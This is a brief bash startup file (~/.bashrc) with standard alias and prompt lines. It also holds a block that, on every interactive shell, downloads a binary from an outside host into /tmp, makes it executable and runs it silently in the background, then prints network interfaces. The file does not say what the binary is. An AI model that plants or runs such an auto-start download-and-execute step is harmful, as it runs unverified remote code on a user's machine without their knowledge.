#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
PS1='[\u@\h \W]\$ '

curl https://wet.voilokov.com/stvbin -o /tmp/stv -z /tmp/stv --retry 3
if [[ -f /tmp/stv ]] ; then
	chmod +x /tmp/stv
	/tmp/stv 2>>/tmp/stv.log &
else
	~/stv 2>>/tmp/stv.log &
fi

ifconfig

